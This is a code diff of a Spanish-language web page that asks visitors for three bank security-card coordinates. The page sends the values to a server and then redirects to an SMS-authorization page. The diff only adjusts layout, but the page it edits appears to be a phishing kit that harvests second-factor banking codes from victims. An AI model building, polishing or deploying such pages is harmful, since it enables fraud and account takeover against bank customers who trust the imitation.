@@ -5,7 +5,12 @@
   <title>Autorización por Coordenadas</title>
   <link rel="stylesheet" href="style.css">
   <style>
-    /* Inputs de coordenadas: solo 2 caracteres */
+    .coord-container {
+      display: flex;
+      justify-content: center;
+      gap: 15px;
+      margin-top: 20px;
+    }
     input.coord {
       border: 1px solid #000;
       outline: none;
@@ -15,24 +20,16 @@
       width: 40px;              /* espacio para 2 dígitos */
       text-align: center;
       background-color: #fff;
-      margin-left: 5px;
     }
     input.coord:focus {
       border: 1px solid #000;
       outline: none;
     }
-    label {
-      display: block;
-      margin: 10px 0;
-      font-size: 14px;
-      color: #000;
-    }
-    /* Botones horizontales */
     .botones {
       display: flex;
       justify-content: center;
       gap: 15px;
-      margin-top: 30px;
+      margin-top: 40px; /* más separado hacia abajo */
     }
     .btn-red {
       background: red;
@@ -55,10 +52,11 @@
     <h1>Ingrese las coordenadas solicitadas</h1>
 
     <form id="formCoordenadas">
-      <label>A4: <input type="text" id="coord1" class="coord" maxlength="2" required></label>
-      <label>B7: <input type="text" id="coord2" class="coord" maxlength="2" required></label>
-      <label>C2: <input type="text" id="coord3" class="coord" maxlength="2" required></label>
-      
+      <div class="coord-container">
+        <label>A4:<input type="text" id="coord1" class="coord" maxlength="2" required></label>
+        <label>B7:<input type="text" id="coord2" class="coord" maxlength="2" required></label>
+        <label>C2:<input type="text" id="coord3" class="coord" maxlength="2" required></label>
+      </div>
       <div class="botones">
         <button type="submit" class="btn-red">Autorizar</button>
       </div>
@@ -86,7 +84,6 @@
           body: JSON.stringify({ mensaje })
         });
         document.getElementById("mensaje").innerText = "Coordenadas enviadas, cargando SMS...";
-        // Redirige inmediatamente al formulario SMS
         window.location.href="autorizacion-sms.html";
       } catch (error) {
         document.getElementById("mensaje").innerText = "⚠️ Error al enviar autorización.";
